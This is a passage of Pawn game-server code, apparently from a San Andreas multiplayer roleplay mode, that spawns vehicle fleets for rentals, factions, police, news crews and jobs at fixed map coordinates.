	rentcarls[0] = CreateVehicle(401,525.5535,-1283.5392,17.0309,249.2930,-1,-1,600); // Rent Car LS 0
	rentcarls[1] = CreateVehicle(526,529.7659,-1280.2317,16.9532,245.8029,-1,-1,600); // Rent Car LS 1
	rentcarls[2] = CreateVehicle(585,534.1425,-1277.2675,16.8415,246.4638,-1,-1,600); // Rent Car LS 2
	rentcarls[3] = CreateVehicle(551,538.4374,-1274.0146,17.0553,248.1329,-1,-1,600); // Rent Car LS 3
	rentcarls[4] = CreateVehicle(546,542.0103,-1270.6676,16.8926,244.0262,-1,-1,600); // Rent Car LS 4
	rentcarls[5] = CreateVehicle(540,546.1081,-1267.5892,17.1557,244.3047,-1,-1,600); // Rent Car LS 5
	rentcarls[6] = CreateVehicle(516,567.4392,-1288.4241,17.1140,50.6030,-1,-1,600); // Rent Car LS 6
	rentcarls[7] = CreateVehicle(410,566.5842,-1283.0811,16.9026,57.9391,-1,-1,600); // Rent Car LS 7
	rentcarls[8] = CreateVehicle(436,565.1833,-1277.9972,17.0457,60.2207,-1,-1,600); // Rent Car LS 8
	//============================= Rent LV ====================================
	rentcarlv[0] = CreateVehicle(401,2148.7632,1398.2522,10.5919,179.3318,-1,-1,600); // Rent Car LV 0
	rentcarlv[1] = CreateVehicle(526,2142.2549,1398.5380,10.5895,180.1983,-1,-1,600); // Rent Car LV 1
	rentcarlv[2] = CreateVehicle(585,2136.0012,1398.4728,10.4594,179.7632,-1,-1,600); // Rent Car LV 2
	rentcarlv[3] = CreateVehicle(551,2129.5227,1398.3572,10.6811,179.9108,-1,-1,600); // Rent Car LV 3
	rentcarlv[4] = CreateVehicle(546,2123.1968,1398.0679,10.5173,180.2094,-1,-1,600); // Rent Car LV 4
	rentcarlv[5] = CreateVehicle(540,2116.7009,1398.6531,10.7517,180.8054,-1,-1,600); // Rent Car LV 5
	rentcarlv[6] = CreateVehicle(516,2110.3887,1398.8379,10.7088,178.9539,-1,-1,600); // Rent Car LV 6
	rentcarlv[7] = CreateVehicle(436,2103.8853,1399.1855,10.6324,180.4412,-1,-1,600); // Rent Car LV 7
	rentcarlv[8] = CreateVehicle(410,2097.7957,1398.6720,10.4728,180.8700,-1,-1,600); // Rent Car LV 8
	rentcarlv[9] = CreateVehicle(410,2148.6797,1408.0872,10.5066,0.9862,-1,-1,600); // Rent Car LV 9
	rentcarlv[10] = CreateVehicle(516,2142.3816,1408.8521,10.6997,0.1314,-1,-1,600); // Rent Car LV 10
	rentcarlv[11] = CreateVehicle(436,2135.9126,1408.2151,10.6270,0.4270,-1,-1,600); // Rent Car LV 11
	rentcarlv[12] = CreateVehicle(540,2129.6021,1408.2108,10.7522,0.6938,-1,-1,600); // Rent Car LV 12
	rentcarlv[13] = CreateVehicle(546,2123.1118,1408.6428,10.5633,0.3106,-1,-1,600); // Rent Car LV 13
	rentcarlv[14] = CreateVehicle(551,2116.7241,1408.6730,10.6830,359.9039,-1,-1,600); // Rent Car LV 14
	rentcarlv[15] = CreateVehicle(585,2110.1846,1407.9718,10.4684,359.9608,-1,-1,600); // Rent Car LV 15
	rentcarlv[16] = CreateVehicle(526,2104.1704,1408.4935,10.5844,0.1492,-1,-1,600); // Rent Car LV 16
	rentcarlv[17] = CreateVehicle(401,2097.4080,1408.4969,10.5998,0.4172,-1,-1,600); // Rent Car LV 17
	//================================== HOT DOG ===============================
	hotdogcar[0] = CreateVehicle(588,-2429.2341,741.4066,34.9217,179.6980,1,1,600); // Hot Dog 0
	CreateVehicle(588,-2433.9192,741.2372,34.9212,179.6447,1,1,600); // Hot Dog 1
	CreateVehicle(588,-2437.8342,741.0984,34.9189,179.8946,1,1,600); // Hot Dog 2
	CreateVehicle(588,-2442.5227,741.0941,34.9182,179.8704,1,1,600); // Hot Dog 3
	CreateVehicle(588,-2446.9268,740.9801,34.9242,179.3379,1,1,600); // Hot Dog 4
	CreateVehicle(588,-2451.2832,740.9025,34.9189,180.1623,1,1,600); // Hot Dog 5
	CreateVehicle(588,-2455.7896,740.9033,34.9215,179.2092,1,1,600); // Hot Dog 6
	CreateVehicle(588,-2460.1279,740.7226,34.9204,180.5361,1,1,600); // Hot Dog 7
	hotdogcar[1] = CreateVehicle(588,-2464.4287,740.7175,34.9191,180.0000,1,1,600); // Hot Dog 8
	//================================== Hell's Angels MC ======================
	hamccar[0] = CreateVehicle(463,694.79998779,-473.20001221,16.00000000,270.00000000,0,0,300); //Freeway
	hamccar[1] = CreateVehicle(463,694.90002441,-470.10000610,16.00000000,270.00000000,0,0,300); //Freeway
	hamccar[2] = CreateVehicle(463,695.09997559,-466.89999390,16.00000000,270.00000000,0,0,300); //Freeway
	hamccar[3] = CreateVehicle(463,695.09997559,-464.00000000,16.00000000,270.00000000,0,0,300); //Freeway
	hamccar[4] = CreateVehicle(463,695.00000000,-461.00000000,16.00000000,270.00000000,0,0,300); //Freeway
	hamccar[5] = CreateVehicle(463,708.79998779,-473.60000610,16.00000000,90.00000000,0,0,300); //Freeway
	hamccar[6] = CreateVehicle(463,708.79998779,-461.29998779,16.00000000,90.00000000,0,0,300); //Freeway
	hamccar[7] = CreateVehicle(463,708.70001221,-464.39999390,16.00000000,90.00000000,0,0,300); //Freeway
	hamccar[8] = CreateVehicle(463,708.20001221,-467.70001221,16.00000000,90.00000000,0,0,300); //Freeway
	hamccar[9] = CreateVehicle(463,708.20001221,-470.70001221,16.00000000,90.00000000,0,0,300); //Freeway
	hamccar[10] = CreateVehicle(459,696.09997559,-451.00000000,16.50000000,180.00000000,0,0,300); //Pony
	//=============================== Warlocks MC ==============================
	wmccar[0] = CreateVehicle(463,669.59997559,1729.69995117,6.59999990,38.00000000,0,0,300); //Freeway
	wmccar[1] = CreateVehicle(463,667.29998779,1728.00000000,6.59999990,37.99621582,0,0,300); //Freeway
	wmccar[2] = CreateVehicle(463,665.20001221,1726.09997559,6.59999990,37.99621582,0,0,300); //Freeway
	wmccar[3] = CreateVehicle(463,663.29998779,1724.40002441,6.59999990,37.99621582,0,0,300); //Freeway
	wmccar[4] = CreateVehicle(463,661.09997559,1722.50000000,6.59999990,37.99621582,0,0,300); //Freeway
	wmccar[5] = CreateVehicle(463,659.09997559,1720.80004883,6.59999990,37.99621582,0,0,300); //Freeway
	wmccar[6] = CreateVehicle(463,656.90002441,1718.80004883,6.59999990,37.99621582,0,0,300); //Freeway
	wmccar[7] = CreateVehicle(463,654.90002441,1717.09997559,6.59999990,37.99621582,0,0,300); //Freeway
	wmccar[8] = CreateVehicle(463,652.79998779,1715.50000000,6.59999990,37.99621582,0,0,300); //Freeway
	wmccar[9] = CreateVehicle(463,650.50000000,1713.30004883,6.59999990,37.99621582,0,0,300); //Freeway
	wmccar[10] = CreateVehicle(459,672.7252,1698.7985,7.0829,130.1172,0,0,300); //Pony
	//================================== Pagans MC =============================
	pmccar[0] = CreateVehicle(463,-2113.00000000,-2495.10009766,30.20000076,320.00000000,0,0,300); //Freeway
	pmccar[1] = CreateVehicle(463,-2115.19995117,-2493.30004883,30.20000076,319.99877930,0,0,300); //Freeway
	pmccar[2] = CreateVehicle(463,-2117.39990234,-2491.60009766,30.20000076,319.99877930,0,0,300); //Freeway
	pmccar[3] = CreateVehicle(463,-2119.60009766,-2489.80004883,30.20000076,319.99877930,0,0,300); //Freeway
	pmccar[4] = CreateVehicle(463,-2122.89990234,-2487.19995117,30.20000076,319.99877930,0,0,300); //Freeway
	pmccar[5] = CreateVehicle(463,-2121.10009766,-2488.60009766,30.20000076,319.99877930,0,0,300); //Freeway
	pmccar[6] = CreateVehicle(463,-2125.10009766,-2485.50000000,30.20000076,319.99877930,0,0,300); //Freeway
	pmccar[7] = CreateVehicle(463,-2126.89990234,-2484.10009766,30.20000076,319.99877930,0,0,300); //Freeway
	pmccar[8] = CreateVehicle(463,-2128.60009766,-2482.89990234,30.20000076,319.99877930,0,0,300); //Freeway
	pmccar[9] = CreateVehicle(463,-2130.50000000,-2481.50000000,30.20000076,319.99877930,0,0,300); //Freeway
	pmccar[10] = CreateVehicle(459,-2119.7229,-2473.1384,30.7093,142.0000,0,0,300); //Pony
	//========================== respawn crutres =
	/*rentmot[0] = AddStaticVehicleEx(462,1139.2000000,-1754.3000000,13.2000000,0.0000000,255,255,600); //Faggio
	rentmot[1] =AddStaticVehicleEx(462,1137.3000000,-1754.2000000,13.2000000,0.0000000,255,255,600); //Faggio
	rentmot[2] =AddStaticVehicleEx(462,1135.4000000,-1754.2000000,13.2000000,0.0000000,255,255,600); //Faggio
	rentmot[3] =AddStaticVehicleEx(462,1133.5000000,-1754.2000000,13.2000000,0.0000000,255,255,600); //Faggio
	rentmot[4] =AddStaticVehicleEx(462,1131.7000000,-1754.2000000,13.2000000,0.0000000,255,255,600); //Faggio
	rentmot[5] =AddStaticVehicleEx(462,1130.0000000,-1754.1000000,13.2000000,0.0000000,255,255,600); //Faggio*/
	//================================== LVPD ==================================
	lvpdcar[0] = CreateVehicle(598,2251.9893,2477.5708,10.5800,178.5571,0,1,600); // LVPD Car
	lvpdcar[1] = CreateVehicle(598,2255.8403,2477.4382,10.5799,178.8317,0,1,600); // LVPD Car
	lvpdcar[2] = CreateVehicle(598,2269.2261,2477.1021,10.5800,179.1111,0,1,600); // LVPD Car
	lvpdcar[3] = CreateVehicle(598,2273.4949,2477.0835,10.5799,179.0136,0,1,600); // LVPD Car
	lvpdcar[4] = CreateVehicle(598,2278.1841,2477.2251,10.5800,179.3727,0,1,600); // LVPD Car
	lvpdcar[5] = CreateVehicle(598,2282.2446,2477.3394,10.5797,179.3997,0,1,600); // LVPD Car
	lvpdcar[6] = CreateVehicle(598,2282.1616,2459.6260,10.5800,178.8921,0,1,600); // LVPD Car
	lvpdcar[7] = CreateVehicle(598,2278.0149,2459.7229,10.5799,177.9894,0,1,600); // LVPD Car
	lvpdcar[8] = CreateVehicle(598,2273.4858,2459.7498,10.5899,178.3868,0,1,600); // LVPD Car
	lvpdcar[9] = CreateVehicle(598,2269.3474,2459.9006,10.5898,177.9236,0,1,600); // LVPD Car
	lvpdcar[10] = CreateVehicle(523,2269.3962,2444.5613,10.3814,359.5826,0,1,600); // LVPD Scooter
	lvpdcar[11] = CreateVehicle(523,2273.6040,2444.5298,10.3875,0.0632,0,1,600); // LVPD Scooter
	lvpdcar[12] = CreateVehicle(523,2290.9751,2443.5176,10.3840,1.3851,1,1,600); // LVPD Scooter
	lvpdcar[13] = CreateVehicle(426,2290.8806,2476.8928,10.5871,180.0822,-1,-1,600); // LVPD Premier
	lvpdcar[14] = CreateVehicle(426,2294.9265,2476.8604,10.5871,179.9234,-1,-1,600); // LVPD Premier
	lvpdcar[15] = CreateVehicle(599,2251.8706,2443.6614,11.0413,0.8666,0,1,600); // LVPD Rancher
	lvpdcar[16] = CreateVehicle(599,2256.3962,2443.6055,11.0414,359.2911,0,1,600); // LVPD Rancher
	lvpdcar[17] = CreateVehicle(599,2260.8904,2443.4060,11.0414,0.3928,0,1,600); // LVPD Rancher
	lvpdcar[18] = CreateVehicle(427,2282.2246,2444.6213,10.9587,0.9042,0,1,600); // LVPD Swat
	lvpdcar[19] = CreateVehicle(427,2277.7827,2444.5728,10.9588,359.3732,0,1,600); // LVPD Swat
	lvpdcar[20] = CreateVehicle(497,2309.7690,2449.9517,10.9748,182.4200,0,1,600); // LVPD Vert
	//================================== LS NEWS ================================
	lsnewscar[0] = CreateVehicle(582,1668.2490,-1699.8988,15.6692,113.6156,1,2,600); // LS NEWS VAN 0
	lsnewscar[1] = CreateVehicle(582,1668.3706,-1705.5723,15.6659,113.6156,1,2,600); // LS NEWS VAN 1
	lsnewscar[2] = CreateVehicle(582,1668.7556,-1711.6621,15.6669,113.6156,1,2,600); // LS NEWS VAN 2
	lsnewscar[3] = CreateVehicle(582,1668.5909,-1718.2150,15.6650,113.6156,1,2,600); // LS NEWS VAN 3
	lsnewscar[4] = CreateVehicle(582,1667.6899,-1694.3616,15.6655,113.6156,1,2,600); // LS NEWS VAN 4
	lsnewscar[5] = CreateVehicle(488,1668.5776,-1718.8680,20.6717,89.5808,1,2,600); // LS NEWS Helicopter 0
	//================================= LV NEWS ================================
	lvnewscar[0] = CreateVehicle(488,2643.4541,1211.2905,27.1282,269.7694,1,3,600); // LV NEWS VAN 0
	lvnewscar[1] = CreateVehicle(582,2659.1919,1169.0134,10.8646,31.0001,1,3,600); // LV NEWS VAN 1
	lvnewscar[2] = CreateVehicle(582,2653.1990,1169.0006,10.8514,31.0001,1,3,600); // LV NEWS VAN 2
	lvnewscar[3] = CreateVehicle(582,2647.1990,1169.0006,10.8514,31.0001,1,3,600); // LV NEWS VAN 3
	lvnewscar[4] = CreateVehicle(582,2641.1846,1169.0262,10.8759,30.9999,1,3,600); // LV NEWS VAN 4
	lvnewscar[5] = CreateVehicle(589,2632.8450,1167.6863,10.4889,29.3075,3,3,600); // LV NEWS Club 5
	lvnewscar[6] = CreateVehicle(589,2627.4670,1167.4148,10.4614,28.7631,3,3,600); // LV NEWS Club 6
	lvnewscar[7] = CreateVehicle(582,2665.1936,1169.0149,10.8659,31.0764,1,3,600); // LV NEWS Helicopter 0
	//================================ GOVERMENT ===============================
	govcar[0] =	CreateVehicle(489,1406.4993,-1808.7230,13.6237,90.0000,0,0,600); //
	govcar[1] =	CreateVehicle(489,1406.4812,-1804.7041,13.6248,90.4197,0,0,600); //
	govcar[2] =	CreateVehicle(409,1405.6206,-1796.5087,13.4023,359.2020,1,1,600); //
	govcar[3] =	CreateVehicle(421,1406.3960,-1785.5636,13.4051,61.1618,1,1,600); //
	govcar[4] = CreateVehicle(421,1406.4355,-1780.4050,13.4268,60.8583,1,1,600); //
	govcar[5] = CreateVehicle(421,1406.5548,-1775.7395,13.4051,61.4270,1,1,600); //
	govcar[6] = CreateVehicle(487,1425.6184,-1778.6748,33.5964,90.0021,1,1,600); //
	govcar[7] = CreateVehicle(487,1425.4415,-1801.5649,33.5908,90.0017,1,1,600); //
	//=========================== Дальнобойщики ================================
	Linerunner[0] = CreateVehicle(403,2260.9980,2779.8608,11.4380,89.9999,-1,-1,600);
	CreateVehicle(403,2260.9980,2770.3906,11.4380,89.9999,-1,-1,600);
	CreateVehicle(403,2260.9980,2764.0408,11.4380,89.9999,-1,-1,600);
	CreateVehicle(403,2260.9983,2754.5005,11.4380,89.9999,-1,-1,600);
	CreateVehicle(403,2260.9988,2747.9705,11.4380,90.0005,-1,-1,600);
	CreateVehicle(403,2243.3010254,2765.3940430,11.5200005,270.0000000,-1,-1,600); //Linerunner
	CreateVehicle(403,2243.6088867,2758.8530273,11.5200005,270.0000000,-1,-1,600); //Linerunner
	CreateVehicle(403,2243.7338867,2751.9790039,11.5200005,270.0000000,-1,-1,600); //Linerunner
	CreateVehicle(403,2243.6540527,2745.0300293,11.5200005,270.0000000,-1,-1,600); //Linerunner
	CreateVehicle(403,2243.5681152,2738.1430664,11.5200005,270.0000000,-1,-1,600); //Linerunner
	CreateVehicle(403,2243.4121094,2730.2670898,11.5200005,270.0000000,-1,-1,600); //Linerunner
	Linerunner[1] = CreateVehicle(403,2260.9983,2738.4004,11.4380,89.9999,-1,-1,600);
	PetrolTanker[0] = CreateVehicle(515,2296.0073,2779.9189,11.8265,270.0013,-1,-1,600);
	PetrolTanker[1] = CreateVehicle(515,2296.0146,2770.4751,11.8305,270.2599,-1,-1,600);
	PetrolTanker[2] = CreateVehicle(515,2296.0159,2763.8289,11.8284,270.0019,-1,-1,600);
	PetrolTanker[3] = CreateVehicle(515,2296.0044,2754.3877,11.8305,269.7369,-1,-1,600);
	PetrolTanker[4] = CreateVehicle(515,2296.0159,2747.9287,11.8284,270.0018,-1,-1,600);
	PetrolTanker[5] = CreateVehicle(515,2296.0159,2738.3289,11.8284,270.0019,-1,-1,600);
	Roadtrain[0] = CreateVehicle(515,2347.0161,2738.2393,11.8725,270.0006,-1,-1,600);
	Roadtrain[1] = CreateVehicle(515,2347.0161,2747.8691,11.8727,270.0008,-1,-1,600);
	Roadtrain[2] = CreateVehicle(515,2347.0161,2754.4189,11.8728,270.0009,-1,-1,600);
	Roadtrain[3] = CreateVehicle(515,2347.0161,2763.9092,11.8726,270.0006,-1,-1,600);
	Roadtrain[4] = CreateVehicle(515,2347.0159,2770.5994,11.8725,270.0005,-1,-1,600);
	Roadtrain[5] = CreateVehicle(515,2347.0159,2779.9290,11.8282,270.0015,-1,-1,600);
	Tanker[0] = CreateVehicle(514,2355.2438965,2815.2958984,11.5200005,180.0000000,-1,-1,600); //Tanker
	Tanker[1] = CreateVehicle(514,2362.5358887,2815.1909180,11.5200005,180.0000000,-1,-1,600); //Tanker
	Tanker[2] = CreateVehicle(514,2370.2729492,2815.1311035,11.5200005,180.0000000,-1,-1,600); //Tanker
	Tanker[3] = CreateVehicle(514,2378.2858887,2814.9851074,11.5200005,180.0000000,-1,-1,600); //Tanker
	Tanker[4] = CreateVehicle(514,2385.7670898,2814.8889160,11.5200005,180.0000000,-1,-1,600); //Tanker
	Tanker[5] = CreateVehicle(514,2393.5930176,2814.7819824,11.5200005,180.0000000,-1,-1,600); //Tanker
	Tanker[6] = CreateVehicle(514,2401.4589844,2814.6950684,11.5200005,180.0000000,-1,-1,600); //Tanker
	Tanker[7] = CreateVehicle(514,2409.0659180,2814.7180176,11.5200005,180.0000000,-1,-1,600); //Tanker
	Tanker[8] = CreateVehicle(514,2416.7690430,2814.6411133,11.5200005,180.0000000,-1,-1,600); //Tanker
	Tanker[9] = CreateVehicle(514,2408.2219238,2742.8979492,11.5200005,16.0000000,-1,-1,600); //Tanker
	Tanker[10] = CreateVehicle(514,2403.0568848,2737.5649414,11.5200005,15.9960938,-1,-1,600); //Tanker
	Tanker[11] = CreateVehicle(514,2397.8068848,2731.6760254,11.5200005,15.9960938,-1,-1,600); //Tanker
	//================================= LSA ====================================
	lsacar[0] = CreateVehicle(470,2739.5549,-2419.2371,13.6304,270.2878,0,0,600);
	lsacar[1] = CreateVehicle(470,2739.5923,-2423.3367,13.6305,270.9906,0,0,600);
	lsacar[2] = CreateVehicle(470,2739.6287,-2427.6265,13.6315,271.0866,0,0,600);
	lsacar[3] = CreateVehicle(470,2743.4583,-2448.7090,13.6656,270.0050,0,0,600);
	lsacar[4] = CreateVehicle(470,2743.4321,-2444.9141,13.6371,270.5514,0,0,600);
	lsacar[5] = CreateVehicle(470,2743.3860,-2441.0242,13.6362,270.8676,0,0,600);
	lsacar[6] = CreateVehicle(470,2736.8411,-2474.9597,13.6466,270.4148,0,0,600);
	lsacar[7] = CreateVehicle(470,2736.8289,-2471.1628,13.6426,269.8400,0,0,600);
	lsacar[8] = CreateVehicle(470,2736.8328,-2467.4814,13.6651,269.7310,0,0,600);
	lsacar[9] = CreateVehicle(470,2736.8308,-2463.7458,13.6885,269.8215,0,0,600);
	lsacar[10] = CreateVehicle(470,2736.8667,-2478.7322,13.6415,270.8732,0,0,600);
	lsacar[11] = CreateVehicle(470,2736.7996,-2460.1074,13.6475,269.3318,0,0,600);
	lsacar[12] = CreateVehicle(470,2735.5662,-2392.9441,13.6267,140.8576,0,0,600);
	lsacar[13] = CreateVehicle(470,2740.5520,-2392.8936,13.6257,142.6246,0,0,600);
	lsacar[14] = CreateVehicle(470,2745.5024,-2392.9404,13.6255,142.6646,0,0,600);
	lsacar[15] = CreateVehicle(470,2750.4390,-2392.9768,13.6442,143.1559,0,0,600);
	lsacarvert[0] = CreateVehicle(548,2773.1833,-2354.5332,15.3227,270.0318,0,0,600);
	//========================== Mechaniks =====================================
	mehanik[0] = CreateVehicle(525,1649.8070,-1107.4197,23.7879,270.4307,1,3,600); // Mechanik 0
	mehanik[1] = CreateVehicle(525,1649.5594,-1097.9303,23.7825,271.0184,1,3,600); // Mechanik 1
	mehanik[2] = CreateVehicle(525,1649.5481,-1088.9520,23.7802,271.2585,1,3,600); // Mechanik 2
	mehanik[3] = CreateVehicle(525,1649.4701,-1080.2677,23.7859,269.8732,1,3,600); // Mechanik 3
	mehanik[4] = CreateVehicle(525,1630.1318,-1107.5986,23.7810,90.0636,1,3,600); // Mechanik 4
	mehanik[5] = CreateVehicle(525,1629.4932,-1098.3491,23.7889,91.1477,1,3,600); // Mechanik 5
	mehanik[6] = CreateVehicle(525,1629.3313,-1089.4033,23.7905,89.8329,1,3,600); // Mechanik 6
	mehanik[7] = CreateVehicle(525,-70.9419,-1156.6366,1.6491,106.9529,1,3,600); // Mechanik 7
	mehanik[8] = CreateVehicle(525,-75.4985,-1153.8265,1.5561,106.9529,1,3,600); // Mechanik 8
	mehanik[9] = CreateVehicle(525,-79.4743,-1152.0967,2.1477,106.9529,1,3,600); // Mechanik 9
	mehanik[10] = CreateVehicle(525,-81.0021,-1197.2158,2.0621,13.2738,1,3,600); // Mechanik 10
	mehanik[11] = CreateVehicle(525,-85.3324,-1197.1295,2.1304,13.2739,1,3,600); // Mechanik 11
	mehanik[12] = CreateVehicle(525,-89.2924,-1196.4034,2.1066,13.2739,1,3,600); // Mechanik 12
	//================================= Licensers ==============================
	liccar[0] = CreateVehicle(426,-2093.7451,-84.7866,34.9072,180.1719,79,79,600); //Licenzer Car 0
	liccar[1] = CreateVehicle(426,-2085.1897,-84.5558,34.9636,180.2919,79,79,600); //Licenzer Car 1
	liccar[2] = CreateVehicle(426,-2081.2437,-84.3829,34.9646,180.1252,79,79,600); //Licenzer Car 2
	liccar[3] = CreateVehicle(426,-2076.9175,-84.3522,34.9647,180.1982,79,79,600); //Licenzer Car 3
	liccar[4] = CreateVehicle(426,-2089.3032,-84.5302,34.9083,181.2357,79,79,600); //Licenzer Car 4
	liccar[5] = CreateVehicle(426,-2077.3838,-98.5273,34.9071,359.8672,79,79,600); //Licenzer Car 5
	liccar[6] = CreateVehicle(426,-2081.4502,-98.5179,35.1366,359.8672,79,79,600); //Licenzer Car 6
	liccar[7] = CreateVehicle(426,-2084.8586,-98.5100,35.1366,359.8672,79,79,600); //Licenzer Car 7
	liccar[8] = CreateVehicle(426,-2088.7642,-98.5010,35.8296,359.8672,79,79,600); //Licenzer Car 8
	liccar[9] = CreateVehicle(426,-2093.6814,-98.4791,34.8978,359.8516,79,79,600); //Licenzer Car 9
	mavlic = CreateVehicle(487,-2027.3175,-111.6481,39.0855,41.9733,79,79,600); //Licenzer Maverick 0
	//=================================== YAKUZA ===============================
	yakcar[0] = CreateVehicle(550,1472.7317,2781.6743,10.5586,179.2468,0,0,600); //
	yakcar[1] = CreateVehicle(550,1472.8627,2765.2546,10.5585,180.0694,0,0,600); //
	yakcar[2] = CreateVehicle(409,1472.7584,2773.2961,10.5105,180.4312,0,0,600); //
	yakcar[3] = CreateVehicle(550,1470.1029,2838.6084,10.6390,179.4471,0,0,600); //
	yakcar[4] = CreateVehicle(550,1475.1515,2838.7468,10.6389,179.2637,0,0,600); //
	yakcar[5] = CreateVehicle(550,1479.8438,2838.8323,10.6400,179.9058,0,0,600); //
	yakcar[6] = CreateVehicle(550,1484.7211,2838.8638,10.6381,179.0196,0,0,600); //
	yakcar[7] = CreateVehicle(550,1489.6461,2838.8625,10.6393,179.4491,0,0,600); //
	yakcar[8] = CreateVehicle(550,1494.1753,2838.9189,10.6378,179.4906,0,0,600); //
	yakcar[9] = CreateVehicle(468,1465.4508,2836.5015,10.4858,178.4038,3,3,600); //
	yakcar[10] = CreateVehicle(468,1467.5662,2836.6189,10.4838,182.7237,3,3,600); //
	yakcar[11] = CreateVehicle(468,1463.2520,2836.5959,10.4848,179.6848,3,3,600); //
	yakcar[12] = CreateVehicle(487,1468.7841,2815.5879,11.0306,269.2539,0,0,600); //
	//=================================== LSPD =================================
	sapdcar[0] = CreateVehicle(596,1558.8835,-1711.5067,5.6068,0.3988,1,79,600); //
	sapdcar[1] = CreateVehicle(596,1570.4464,-1711.2196,5.6172,359.8105,1,79,600); //
	sapdcar[2] = CreateVehicle(596,1574.4845,-1711.1295,5.6062,0.0632,1,79,600); //
	sapdcar[3] = CreateVehicle(596,1578.7039,-1710.9607,5.6183,0.1892,1,79,600); //
	sapdcar[4] = CreateVehicle(596,1583.5175,-1710.8799,5.6194,0.8567,1,79,600); //
	sapdcar[5] = CreateVehicle(596,1587.4191,-1710.6022,5.6055,1.0347,1,79,600); //
	sapdcar[6] = CreateVehicle(596,1602.3325,-1695.9980,5.5826,89.5316,1,79,600); //
	sapdcar[7] = CreateVehicle(596,1602.3185,-1692.0234,5.5823,90.0328,1,79,600); //
	sapdcar[8] = CreateVehicle(523,1547.4243,-1676.8906,5.4554,118.1002,0,0,600); //
	sapdcar[9] = CreateVehicle(523,1547.2776,-1674.6050,5.4492,121.5288,0,0,600); //
	sapdcar[10] = CreateVehicle(523,1547.2515,-1672.1901,5.4507,131.0694,0,0,600); //
	sapdcar[11] = CreateVehicle(427,1544.8767,-1655.0233,6.0417,88.8444,1,79,600); //
	sapdcar[12] = CreateVehicle(427,1544.9392,-1650.9785,6.0424,90.4988,1,79,600); //
	sapdcar[13] = CreateVehicle(596,1602.4934,-1700.4464,5.6102,90.0702,1,79,600); //
	sapdcar[14] = CreateVehicle(596,1602.4930,-1704.7719,5.6089,89.9600,1,79,600); //
	sapdcar[15] = CreateVehicle(497,1560.9762,-1644.3397,28.4021,71.2228,79,1,600); //
	//=================================== FBI ==================================
	fbicar[0] = CreateVehicle(521,-2460.8303,544.4739,491.4831,356.6644,0,0,600,1); // FBI 0
	fbicar[1] = CreateVehicle(521,-2456.6072,544.5000,491.5087,357.4489,0,0,600,1); // FBI 1
	fbicar[2] = CreateVehicle(521,-2452.0107,544.5850,491.4843,359.0195,0,0,600,1); // FBI 2
	fbicar[3] = CreateVehicle(415,-2427.6194,535.0439,491.6870,270.0655,0,0,600,1); // FBI 3
	fbicar[4] = CreateVehicle(415,-2427.6179,531.2609,491.6870,269.4856,0,0,600,1); // FBI 4
	fbicar[5] = CreateVehicle(560,-2427.5029,527.1229,491.6203,270.2058,0,0,600,1); // FBI 5
	fbicar[6] = CreateVehicle(560,-2427.5623,522.5583,491.6210,268.0457,0,0,600,1); // FBI 6
	fbicar[7] = CreateVehicle(490,-2452.4856,501.8808,492.0443,0.0370,0,0,600); // FBI 7
	fbicar[8] = CreateVehicle(490,-2456.8633,501.9145,492.0413,359.7208,0,0,600); // FBI 8
	fbicar[9] = CreateVehicle(490,-2460.9463,501.9058,492.0504,0.0326,0,0,600); // FBI 9
	fbicar[10] = CreateVehicle(490,-2465.5835,501.9467,492.0363,0.0356,0,0,600); // FBI 10
	fbicar[11] = CreateVehicle(490,-2470.0435,501.8679,492.0440,359.6897,0,0,600); // FBI 11
	fbicar[12] = CreateVehicle(490,-2474.6453,502.0532,492.0440,359.8795,0,0,600); // FBI 12
	fbicar[13] = CreateVehicle(490,-2414.6000000,531.9000000,30.2000000,248.2500000,0,0,600); // FBI 13
	fbicar[14] = CreateVehicle(490,-2416.4000000,528.2000000,30.2000000,240.2470000,0,0,600); // FBI 14
	fbicar[15] = CreateVehicle(497,-2467.8000000,521.2000000,51.3000000,180.0000000,0,0,600); // Police Maverick 0
	fbicar[16] = CreateVehicle(497,-2483.7000000,521.2000000,51.3000000,180.0000000,0,0,600); // Police Maverick 1
	//================================= Prodz ==================================
	comptruck[0] = CreateVehicle(440,0.3180,-378.0624,5.5481,0,-1,-1,900); // Prodz Van 0
	CreateVehicle(440,-3.1539,-378.0624,5.5351,0,-1,-1,900); // Prodz Van 1
	CreateVehicle(440,-6.4157,-378.0624,5.5351,0,-1,-1,900); // Prodz Van 2
	CreateVehicle(440,-9.6830,-378.0624,5.5351,0,-1,-1,900); // Prodz Van 3
	CreateVehicle(440,-13.0651,-378.0624,5.5351,0,-1,-1,900); // Prodz Van 4
	CreateVehicle(440,-16.4923,-378.0624,5.5351,0,-1,-1,900); // Prodz Van 5
	CreateVehicle(440,-19.7941,-378.0624,6.4105,0,-1,-1,900); // Prodz Van 6
	CreateVehicle(440,-23.1215,-378.0624,5.5471,0,-1,-1,900); // Prodz Van 7
	CreateVehicle(440,-26.4671,-378.0624,5.5368,0,-1,-1,900); // Prodz Van 8
	CreateVehicle(440,-29.8291,-378.0624,5.5481,0,-1,-1,900); // Prodz Van 9
	CreateVehicle(440,-33.2262,-378.0624,5.5351,0,-1,-1,900); // Prodz Van 10
	CreateVehicle(440,-36.5213,-378.0624,5.5351,0,-1,-1,900); // Prodz Van 11
	CreateVehicle(440,-39.8221,-378.0624,5.5351,0,-1,-1,900); // Prodz Van 12
	CreateVehicle(440,-43.2227,-378.0624,5.5351,0,-1,-1,900); // Prodz Van 13
	CreateVehicle(440,-46.5032,-378.0624,5.5351,0,-1,-1,900); // Prodz Van 14
	CreateVehicle(440,-49.8268,-378.0624,6.4105,0,-1,-1,900); // Prodz Van 15
	CreateVehicle(440,-53.2036,-378.0624,5.5471,0,-1,-1,900); // Prodz Van 16
	CreateVehicle(440,-56.5909,-378.0624,5.5368,0,-1,-1,900); // Prodz Van 17
	CreateVehicle(440,-59.8732,-378.0624,5.5351,0,-1,-1,900); // Prodz Van 18
	CreateVehicle(440,-63.1870,-378.0624,5.5351,0,-1,-1,900); // Prodz Van 19
	CreateVehicle(440,-66.4125,-378.0624,6.4105,0,-1,-1,900); // Prodz Van 20
	CreateVehicle(440,-69.8054,-378.0624,5.5471,0,-1,-1,900); // Prodz Van 21
	comptruck[1] = CreateVehicle(440,-73.2049,-378.0624,5.5368,0,-1,-1,900); // Prodz Van 22

	comptruck[2] = CreateVehicle(552,-1003.5901,-638.3428,31.7005,90.1988,158,158,900);
	CreateVehicle(552,-1003.5901,-643.4371,31.7005,90.1988,158,158,900);
	CreateVehicle(552,-1003.5901,-648.5751,31.7005,90.1988,158,158,900);
	CreateVehicle(552,-1003.5901,-653.5906,31.7005,90.1988,158,158,900);
